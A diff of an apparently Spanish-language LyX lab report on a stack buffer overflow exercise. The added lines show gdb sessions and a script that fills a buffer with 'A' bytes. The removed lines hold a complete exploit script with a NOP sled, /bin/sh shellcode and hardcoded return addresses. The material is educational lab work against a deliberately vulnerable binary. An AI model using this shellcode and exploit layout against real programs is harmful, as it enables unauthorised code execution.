@@ -373,22 +373,32 @@ status open
 
 \begin_layout Plain Layout
 
-gdb ./stack
+gdb ./stack-L1-dbg
 \end_layout
 
 \begin_layout Plain Layout
 
-(gdb) break bof
+(gdb) b bof
 \end_layout
 
 \begin_layout Plain Layout
 
-(gdb) run < badfile
+(gdb) stepi
 \end_layout
 
 \begin_layout Plain Layout
 
-(gdb) print &buffer
+(gdb) stepi
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) stepi
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) stepi
 \end_layout
 
 \begin_layout Plain Layout
@@ -398,12 +408,98 @@ gdb ./stack
 
 \begin_layout Plain Layout
 
-(gdb) x/200bx $esp
+ebp            0xffffc8c8          0xffffc8c8
 \end_layout
 
 \begin_layout Plain Layout
 
-(gdb) quit
+(gdb) print &buffer
+\end_layout
+
+\begin_layout Plain Layout
+
+$1 = (char (*)[100]) 0xffffc85c
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+Con el siguiente script fill_aaaa.py se puede llenar el buffer con As y ver
+ como la pila se llena hacia las direcciones mas altas con este contenido.
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#!/usr/bin/env python3 # Fills the buffer with 'A' (0x41) and writes to
+ badfile
+\end_layout
+
+\begin_layout Plain Layout
+
+BUF_SIZE = 517  # Large enough to fill the buffer and overflow
+\end_layout
+
+\begin_layout Plain Layout
+
+with open('badfile', 'wb') as f:     f.write(b'A' * BUF_SIZE) 
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=cppstyle,caption={GDB Commands}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) x/200bx &buffer
+\end_layout
+
+\begin_layout Plain Layout
+
+0xffffc85c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41   
+  0x41
+\end_layout
+
+\begin_layout Plain Layout
+
+0xffffc864:     0x41    0x41    0x41    0x41    0x41    0x41    0x41   
+  0x41
+\end_layout
+
+\begin_layout Plain Layout
+
+0xffffc86c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41   
+  0x41
+\end_layout
+
+\begin_layout Plain Layout
+
+......
 \end_layout
 
 \end_inset
@@ -438,291 +534,23 @@ status open
 
 \begin_layout Plain Layout
 
-#!/usr/bin/env python3
+#!/usr/bin/env python3 # Fills the buffer with 'A' (0x41) and writes to
+ badfile
 \end_layout
 
 \begin_layout Plain Layout
 
+BUF_SIZE = 517  # Large enough to fill the buffer and overflow
 \end_layout
 
 \begin_layout Plain Layout
 
-import sys
+with open('badfile', 'wb') as f:
 \end_layout
 
 \begin_layout Plain Layout
 
-\end_layout
-
-\begin_layout Plain Layout
-
-# Check if gdb mode is requested
-\end_layout
-
-\begin_layout Plain Layout
-
-gdb_mode = len(sys.argv) > 1 and sys.argv[1] == "--gdb"
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# Exploit buffer construction
-\end_layout
-
-\begin_layout Plain Layout
-
-# Buffer layout:
-\end_layout
-
-\begin_layout Plain Layout
-
-# [NOP sled (32)] + [Shellcode (25)] + [Padding (53)] + [Return address
- (4)]
-\end_layout
-
-\begin_layout Plain Layout
-
-# Total: 114 bytes (110 bytes payload + 4 bytes return address)
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# 1.
- NOP sled (32 bytes)
-\end_layout
-
-\begin_layout Plain Layout
-
-nop_sled = b"
-\backslash
-x90" * 32
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# 2.
- Shellcode to spawn /bin/sh (25 bytes)
-\end_layout
-
-\begin_layout Plain Layout
-
-shellcode = (
-\end_layout
-
-\begin_layout Plain Layout
-
-    b"
-\backslash
-x31
-\backslash
-xc0
-\backslash
-x50
-\backslash
-x68
-\backslash
-x2f
-\backslash
-x2f
-\backslash
-x73
-\backslash
-x68"
-\end_layout
-
-\begin_layout Plain Layout
-
-    b"
-\backslash
-x68
-\backslash
-x2f
-\backslash
-x62
-\backslash
-x69
-\backslash
-x6e
-\backslash
-x89
-\backslash
-xe3
-\backslash
-x50"
-\end_layout
-
-\begin_layout Plain Layout
-
-    b"
-\backslash
-x53
-\backslash
-x89
-\backslash
-xe1
-\backslash
-x31
-\backslash
-xd2
-\backslash
-x31
-\backslash
-xc0
-\backslash
-xb0"
-\end_layout
-
-\begin_layout Plain Layout
-
-    b"
-\backslash
-x0b
-\backslash
-xcd
-\backslash
-x80"
-\end_layout
-
-\begin_layout Plain Layout
-
-)
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# 3.
- Padding to reach the saved return address (53 bytes)
-\end_layout
-
-\begin_layout Plain Layout
-
-# Empirically: 110 bytes before return address works
-\end_layout
-
-\begin_layout Plain Layout
-
-# 110 - (32 + 25) = 53
-\end_layout
-
-\begin_layout Plain Layout
-
-padding = b"A" * 53
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# 4.
- Return address pointing into the NOP sled (little endian)
-\end_layout
-
-\begin_layout Plain Layout
-
-# With ASLR disabled and 112-byte offset:
-\end_layout
-
-\begin_layout Plain Layout
-
-# - Normal execution: buffer at 0xffffc8bc → target 0xffffc8b0 works
-\end_layout
-
-\begin_layout Plain Layout
-
-# - GDB execution: buffer at 0xffffc84c → target 0xffffc85c (middle of NOP
- sled)
-\end_layout
-
-\begin_layout Plain Layout
-
-if gdb_mode:
-\end_layout
-
-\begin_layout Plain Layout
-
-    ret_addr = b"
-\backslash
-x5c
-\backslash
-xc8
-\backslash
-xff
-\backslash
-xff"  # For gdb: 0xffffc85c
-\end_layout
-
-\begin_layout Plain Layout
-
-    print("Mode: GDB", file=sys.stderr)
-\end_layout
-
-\begin_layout Plain Layout
-
-else:
-\end_layout
-
-\begin_layout Plain Layout
-
-    ret_addr = b"
-\backslash
-xb0
-\backslash
-xc8
-\backslash
-xff
-\backslash
-xff"  # For normal: 0xffffc8b0
-\end_layout
-
-\begin_layout Plain Layout
-
-    print("Mode: Normal execution", file=sys.stderr)
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# Construct final exploit buffer
-\end_layout
-
-\begin_layout Plain Layout
-
-exploit = nop_sled + shellcode + padding + ret_addr
-\end_layout
-
-\begin_layout Plain Layout
-
-\end_layout
-
-\begin_layout Plain Layout
-
-# Output the exploit buffer as raw bytes
-\end_layout
-
-\begin_layout Plain Layout
-
-sys.stdout.buffer.write(exploit)
+    f.write(b'A' * BUF_SIZE) 
 \end_layout
 
 \end_inset
